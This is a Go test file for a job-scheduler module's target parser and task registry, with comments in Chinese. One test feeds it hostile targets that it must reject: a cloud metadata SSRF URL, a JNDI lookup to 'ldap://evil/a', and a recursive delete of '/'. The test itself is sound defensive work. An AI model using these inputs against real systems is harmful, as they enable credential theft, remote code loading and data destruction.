package job

import (
	"context"
	"strings"
	"testing"
)

// TestParse 调用目标的解析规则，对齐 Java 版 JobInvokeUtil。
func TestParse(t *testing.T) {
	cases := []struct {
		name     string
		target   string
		wantName string
		wantArgs []string
	}{
		{"无参", "ryTask.ryNoParams", "ryTask.ryNoParams", nil},
		{"无参带空括号", "ryTask.ryNoParams()", "ryTask.ryNoParams", nil},
		{"单个字符串参数", "ryTask.ryParams('ry')", "ryTask.ryParams", []string{"ry"}},
		{"双引号也认", `ryTask.ryParams("ry")`, "ryTask.ryParams", []string{"ry"}},
		{
			"种子数据里的多参",
			"ryTask.ryMultipleParams('ry', true, 2000L, 316.50D, 100)",
			"ryTask.ryMultipleParams",
			[]string{"ry", "true", "2000", "316.50", "100"},
		},
		// 【最容易写错的一条】不能简单按逗号切
		{"引号里的逗号不算分隔符", "t.f('a,b', 'c')", "t.f", []string{"a,b", "c"}},
		{"参数前后的空格要去掉", "t.f( 'a' ,  2 )", "t.f", []string{"a", "2"}},
		{"空字符串参数", "t.f('')", "t.f", []string{""}},
		// L/D 后缀只在剩下的部分确实是数字时才去掉
		{"以 D 结尾但不是数字", "t.f('SQLD')", "t.f", []string{"SQLD"}},
		{"不带引号的 SQLD 不能被砍成 SQL", "t.f(SQLD)", "t.f", []string{"SQLD"}},
		{"负数", "t.f(-1)", "t.f", []string{"-1"}},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			name, args, err := Parse(tc.target)
			if err != nil {
				t.Fatalf("Parse(%q) 报错: %v", tc.target, err)
			}
			if name != tc.wantName {
				t.Errorf("任务名 = %q，期望 %q", name, tc.wantName)
			}
			if len(args) != len(tc.wantArgs) {
				t.Fatalf("参数 = %#v，期望 %#v", args, tc.wantArgs)
			}
			for i := range args {
				if args[i] != tc.wantArgs[i] {
					t.Errorf("第 %d 个参数 = %q，期望 %q", i, args[i], tc.wantArgs[i])
				}
			}
		})
	}
}

// TestParseRejects 格式不对时必须报错，而且报错要指到点子上。
func TestParseRejects(t *testing.T) {
	cases := []struct {
		name   string
		target string
		wantIn string
	}{
		{"空串", "", "不能为空"},
		{"只有空格", "   ", "不能为空"},
		{"缺右括号", "t.f('a'", "括号不匹配"},
		{"缺左括号", "t.f')", "括号不匹配"},
		{"只有括号没有任务名", "('a')", "缺少任务名"},
		// 括号是配对的，问题在引号 —— 报错不能笼统说成括号问题
		{"引号没闭合", "t.f('a)", "引号没有闭合"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, _, err := Parse(tc.target)
			if err == nil {
				t.Fatalf("Parse(%q) 本应报错", tc.target)
			}
			if !strings.Contains(err.Error(), tc.wantIn) {
				t.Errorf("报错应包含 %q，实际 %q", tc.wantIn, err)
			}
		})
	}
}

// TestResolveOnlyAcceptsRegistered 注册表是这个模块唯一的安全边界。
//
// Java 用反射调任意 bean，为此堆了白名单 + 黑名单 + 禁 rmi/ldap/http。
// 这里查不到就是查不到，没有绕过去的可能 —— 用几种典型的攻击写法验证。
func TestResolveOnlyAcceptsRegistered(t *testing.T) {
	for _, target := range []string{
		"ryTask.ryNoParams",
		"ryTask.ryParams('x')",
		"ryTask.ryMultipleParams('ry', true, 2000L, 316.50D, 100)",
	} {
		if _, _, err := Resolve(target); err != nil {
			t.Errorf("内置任务 %q 应当能解析: %v", target, err)
		}
	}

	for _, target := range []string{
		"someTask.doSomething",
		"java.net.URL('http://169.254.169.254/')",
		"javax.naming.InitialContext.lookup('ldap://evil/a')",
		"org.springframework.SomeBean.run",
		"org.apache.commons.io.FileUtils.forceDelete('/')",
	} {
		_, _, err := Resolve(target)
		if err == nil {
			t.Errorf("%q 未注册，必须拒绝", target)
			continue
		}
		if !strings.Contains(err.Error(), "未注册") {
			t.Errorf("%q 的报错应说明未注册，实际 %q", target, err)
		}
	}
}

// TestResolveErrorListsAvailable 报错要把可选值列出来。
//
// 只说"任务未注册"，用户得去翻代码才知道能填什么。
func TestResolveErrorListsAvailable(t *testing.T) {
	_, _, err := Resolve("nope.nope")
	if err == nil {
		t.Fatal("本应报错")
	}
	if !strings.Contains(err.Error(), "ryTask.ryNoParams") {
		t.Errorf("报错里应列出可用任务名，实际 %q", err)
	}
}

// TestBuiltinTasksRun 三个内置任务能跑通且不报错。
func TestBuiltinTasksRun(t *testing.T) {
	for _, target := range []string{
		"ryTask.ryNoParams",
		"ryTask.ryParams('hello')",
		"ryTask.ryMultipleParams('ry', true, 2000L, 316.50D, 100)",
	} {
		task, args, err := Resolve(target)
		if err != nil {
			t.Fatalf("Resolve(%q): %v", target, err)
		}
		if err := task(context.Background(), args); err != nil {
			t.Errorf("执行 %q 失败: %v", target, err)
		}
	}
}

// TestArgHelpers 参数读取工具越界时要给零值，不能 panic。
//
// 任务的参数来自后台配置，用户少填一个是常态。
func TestArgHelpers(t *testing.T) {
	args := []string{"text", "true", "42", "3.5"}

	if got := argAt(args, 0); got != "text" {
		t.Errorf("argAt(0) = %q", got)
	}
	if got := argAt(args, 99); got != "" {
		t.Errorf("越界的 argAt 应返回空串，实际 %q", got)
	}
	if got := argAt(args, -1); got != "" {
		t.Errorf("负数下标的 argAt 应返回空串，实际 %q", got)
	}
	if !argBool(args, 1) {
		t.Error("argBool(1) 应为 true")
	}
	if got := argInt(args, 2); got != 42 {
		t.Errorf("argInt(2) = %d", got)
	}
	if got := argFloat(args, 3); got != 3.5 {
		t.Errorf("argFloat(3) = %v", got)
	}
	// 越界和类型不对都给零值
	if got := argInt(args, 0); got != 0 {
		t.Errorf("非数字的 argInt 应返回 0，实际 %d", got)
	}
	if got := argFloat(args, 99); got != 0 {
		t.Errorf("越界的 argFloat 应返回 0，实际 %v", got)
	}
}
